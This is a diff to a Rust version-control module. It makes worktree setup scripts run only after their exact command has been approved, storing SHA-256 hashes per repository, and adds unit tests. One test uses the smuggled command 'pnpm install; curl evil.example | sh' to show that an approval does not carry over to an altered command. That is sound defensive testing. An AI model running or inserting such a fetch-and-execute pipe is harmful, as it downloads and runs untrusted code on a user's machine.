@@ -4,6 +4,7 @@ use std::sync::Arc;
 use std::time::Duration;
 
 use serde::{Deserialize, Serialize};
+use sha2::{Digest, Sha256};
 
 use super::repo::{self, GitCtx};
 use super::runner::{tail, Invocation, VcsError, VcsResult};
@@ -183,6 +184,58 @@ pub fn read_project_config(dir: &Path) -> ProjectConfig {
         }
     }
     ProjectConfig::default()
+}
+
+fn approvals_file() -> VcsResult<PathBuf> {
+    crate::core::paths::app_data_dir()
+        .map(|d| d.join("worktree-setup-approvals.json"))
+        .ok_or_else(|| VcsError::Io("no app data dir".into()))
+}
+
+fn command_hash(command: &str) -> String {
+    hex::encode(Sha256::digest(command.trim().as_bytes()))
+}
+
+fn approvals_key(repo_root: &Path) -> String {
+    canon(repo_root).to_string_lossy().into_owned()
+}
+
+fn load_approvals(file: &Path) -> std::collections::BTreeMap<String, Vec<String>> {
+    std::fs::read(file)
+        .ok()
+        .and_then(|b| serde_json::from_slice(&b).ok())
+        .unwrap_or_default()
+}
+
+fn setup_script_approved_in(file: &Path, repo_root: &Path, command: &str) -> bool {
+    load_approvals(file)
+        .get(&approvals_key(repo_root))
+        .is_some_and(|hashes| hashes.contains(&command_hash(command)))
+}
+
+fn approve_setup_script_in(file: &Path, repo_root: &Path, command: &str) -> VcsResult<()> {
+    if command.trim().is_empty() {
+        return Err(VcsError::Invalid("the setup command is empty".into()));
+    }
+    let mut all = load_approvals(file);
+    let hashes = all.entry(approvals_key(repo_root)).or_default();
+    let hash = command_hash(command);
+    if hashes.contains(&hash) {
+        return Ok(());
+    }
+    hashes.push(hash);
+    let bytes = serde_json::to_vec_pretty(&all).map_err(|e| VcsError::Io(e.to_string()))?;
+    if let Some(parent) = file.parent() {
+        std::fs::create_dir_all(parent)?;
+    }
+    let tmp = file.with_extension("json.tmp");
+    std::fs::write(&tmp, bytes)?;
+    std::fs::rename(&tmp, file)?;
+    Ok(())
+}
+
+pub fn approve_setup_script(repo_root: &Path, command: &str) -> VcsResult<()> {
+    approve_setup_script_in(&approvals_file()?, repo_root, command)
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
@@ -640,6 +693,12 @@ async fn create_inner(
         .iter()
         .filter(|s| s.run_on_worktree_create)
         .collect();
+    let approved = match approvals_file() {
+        Ok(file) => scripts
+            .iter()
+            .all(|s| setup_script_approved_in(&file, &paths.root, &s.command)),
+        Err(_) => false,
+    };
     if !req.run_setup || scripts.is_empty() {
         snap.set(
             "setup-script",
@@ -650,6 +709,8 @@ async fn create_inner(
                 "not requested".into()
             }),
         );
+    } else if !approved {
+        snap.set("setup-script", "skipped", Some("needs approval".into()));
     } else {
         let mut failed = None;
         for s in scripts {
@@ -911,110 +972,64 @@ pub async fn remove(
     })
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
-pub struct WorktreeEntry {
-    pub path: PathBuf,
-    pub head: Option<String>,
-    pub branch: Option<String>,
-    pub thread: Option<String>,
-    pub omniget: bool,
-    pub prunable: bool,
-    pub main: bool,
-}
+#[cfg(test)]
+mod tests {
+    use super::*;
 
-pub async fn list(repo_path: &Path) -> VcsResult<Vec<WorktreeEntry>> {
-    let paths = repo::discover(repo_path).await?;
-    let ctx = GitCtx::Repo {
-        work_tree: paths.root,
-    };
-    let out = ctx
-        .git()
-        .args(["worktree", "list", "--porcelain", "-z"])
-        .run()
-        .await?;
-    let mut list = Vec::new();
-    let mut cur: Option<WorktreeEntry> = None;
-    for rec in out.stdout.split(|b| *b == 0) {
-        let rec = String::from_utf8_lossy(rec);
-        if rec.is_empty() {
-            if let Some(e) = cur.take() {
-                list.push(e);
-            }
-            continue;
-        }
-        if let Some(p) = rec.strip_prefix("worktree ") {
-            if let Some(e) = cur.take() {
-                list.push(e);
-            }
-            let path = PathBuf::from(p);
-            cur = Some(WorktreeEntry {
-                omniget: is_omniget_worktree(&path),
-                main: list.is_empty(),
-                path,
-                head: None,
-                branch: None,
-                thread: None,
-                prunable: false,
-            });
-        } else if let Some(e) = cur.as_mut() {
-            if let Some(h) = rec.strip_prefix("HEAD ") {
-                e.head = Some(h.to_string());
-            } else if let Some(b) = rec.strip_prefix("branch ") {
-                e.branch = Some(b.trim_start_matches("refs/heads/").to_string());
-            } else if rec.starts_with("prunable") {
-                e.prunable = true;
-            }
-        }
-    }
-    if let Some(e) = cur.take() {
-        list.push(e);
-    }
-    for e in list.iter_mut() {
-        if let Some(b) = &e.branch {
-            e.thread = repo::config_get(&ctx, &format!("branch.{b}.omniget-thread")).await;
-        }
-    }
-    Ok(list)
-}
+    #[test]
+    fn a_setup_script_runs_only_after_its_command_was_approved() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("approvals.json");
+        let repo = dir.path().join("repo");
+        std::fs::create_dir_all(&repo).unwrap();
 
-pub async fn cleanup(repo_path: &Path) -> VcsResult<Vec<PathBuf>> {
-    let paths = repo::discover(repo_path).await?;
-    let ctx = GitCtx::Repo {
-        work_tree: paths.root.clone(),
-    };
-    ctx.git().args(["worktree", "prune"]).run().await?;
-    let known: Vec<PathBuf> = list(&paths.root)
-        .await?
-        .into_iter()
-        .map(|e| canon(&e.path))
-        .collect();
-    let root = worktrees_root()?;
-    let prefix = format!(
-        "{}-",
-        slug(
-            &paths
-                .root
-                .file_name()
-                .map(|n| n.to_string_lossy().into_owned())
-                .unwrap_or_default(),
-            40
-        )
-    );
-    let mut removed = Vec::new();
-    if let Ok(rd) = std::fs::read_dir(&root) {
-        for e in rd.flatten() {
-            let p = e.path();
-            let name = e.file_name().to_string_lossy().into_owned();
-            if !name.starts_with(&prefix) || known.contains(&canon(&p)) {
-                continue;
-            }
-            let empty = std::fs::read_dir(&p)
-                .map(|mut r| r.next().is_none())
-                .unwrap_or(false);
-            if p.is_dir() && !p.join(".git").exists() && empty && std::fs::remove_dir(&p).is_ok() {
-                removed.push(p);
-            }
-        }
+        assert!(!setup_script_approved_in(&file, &repo, "pnpm install"));
+        approve_setup_script_in(&file, &repo, "pnpm install").unwrap();
+        assert!(setup_script_approved_in(&file, &repo, "pnpm install"));
     }
-    Ok(removed)
+
+    #[test]
+    fn an_approval_does_not_cover_a_changed_command_or_another_repo() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("approvals.json");
+        let repo = dir.path().join("repo");
+        let other = dir.path().join("other");
+        std::fs::create_dir_all(&repo).unwrap();
+        std::fs::create_dir_all(&other).unwrap();
+        approve_setup_script_in(&file, &repo, "pnpm install").unwrap();
+
+        assert!(!setup_script_approved_in(
+            &file,
+            &repo,
+            "pnpm install; curl evil.example | sh"
+        ));
+        assert!(!setup_script_approved_in(&file, &other, "pnpm install"));
+    }
+
+    #[test]
+    fn approvals_accumulate_and_only_the_hash_is_stored() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("approvals.json");
+        let repo = dir.path().join("repo");
+        std::fs::create_dir_all(&repo).unwrap();
+        approve_setup_script_in(&file, &repo, "pnpm install").unwrap();
+        approve_setup_script_in(&file, &repo, "make setup").unwrap();
+        approve_setup_script_in(&file, &repo, "make setup").unwrap();
+
+        assert!(setup_script_approved_in(&file, &repo, "pnpm install"));
+        assert!(setup_script_approved_in(&file, &repo, "make setup"));
+        let text = std::fs::read_to_string(&file).unwrap();
+        assert!(!text.contains("pnpm install"));
+        assert_eq!(load_approvals(&file).values().next().map(Vec::len), Some(2));
+    }
+
+    #[test]
+    fn an_empty_command_cannot_be_approved() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("approvals.json");
+        assert!(matches!(
+            approve_setup_script_in(&file, dir.path(), "  "),
+            Err(VcsError::Invalid(_))
+        ));
+    }
 }
